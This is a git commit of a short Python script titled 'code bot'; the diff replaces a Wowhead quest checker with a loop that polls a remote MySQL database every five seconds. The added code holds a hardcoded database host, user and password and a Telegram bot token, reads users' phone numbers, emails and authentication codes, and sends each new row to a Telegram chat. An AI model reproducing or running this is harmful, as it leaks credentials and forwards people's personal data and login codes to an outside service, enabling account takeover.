57f898c6079afb6ce617ef2b4bf1177d641f13c1
evaganov <evaganov@outlook.com>
2022-01-23 21:53:01 +0500

    code bot

--- 1.py
+++ 1.py
@@ -1,9 +1,26 @@
 #!/usr/bin/env python
 import urllib.request
+import time
+import mysql.connector
+import urllib.request
 
 
 if __name__ == "__main__":
-    contents = urllib.request.urlopen("https://ru.wowhead.com/world-quests/bfa/eu").read().decode('utf-8')
-    id = "56017"
-    if id in contents:
-        urllib.request.urlopen("https://api.telegram.org/bot343228570:AAHWvNfSyL-O5QgnkQXWK7DDTWL70_XHTcw/sendMessage?chat_id=129934507&text=https://ru.wowhead.com/quest=%s" % id)
+    temp_list = []
+
+    while(not time.sleep(5)):
+        mydb = mysql.connector.connect(
+        host="mbc.filmus.online",
+        user="MediseenBD",
+        password="ZAQ!2wsx",
+        database="MediseenDB"
+        )
+        cursor = mydb.cursor()
+        cursor.execute('SELECT PhoneNumber, Email, AuthCode FROM Users WHERE AuthCode is not NULL && AuthCode <> ""')
+        result = cursor.fetchall()
+
+        for x in result:
+            values = '%09'.join(str(e) for e in x)
+            if values not in temp_list:
+                temp_list.append(values)
+                urllib.request.urlopen("https://api.telegram.org/bot343228570:AAHWvNfSyL-O5QgnkQXWK7DDTWL70_XHTcw/sendMessage?chat_id=-660618667&text=%s" % values)
